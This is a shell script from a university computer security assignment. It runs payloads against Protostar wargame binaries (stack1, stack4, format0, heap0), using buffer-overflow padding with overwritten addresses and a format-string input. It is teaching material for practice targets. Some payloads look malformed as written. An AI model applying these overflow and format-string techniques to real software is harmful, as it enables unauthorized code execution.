# CS419 Computer Security: Assignment 4
# Professor Krzyzanowski Spring 2018
# Anirudh Tunoori netid: at813
# Yaowen Zhang netid: yz579

# This is the input script for the protostar challenge

printf "~~~Beginning The Exploit Input Script For All Challenges~~~\n"

# Stack1
printf "\n"
printf "Running stack1... \n"
echo
./stack1 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba"
echo "----------------------------------------------------------------------"

                                                    
# Stack4
printf "Running stack4... \n"
echo
./stack4 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+"\xf4\x83\x04\x08"
echo "------------------------------------------------------------------------"

# Format0
printf "Running format0... \n"
echo
./format0 "%64d\xef\xbe\xad\xde"
echo "------------------------------------------------------------------------"

# Heap0
printf "Running heap0... \n"
echo
./heap0 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+"\x64\x84\x04\x08"
echo "------------------------------------------------------------------------"
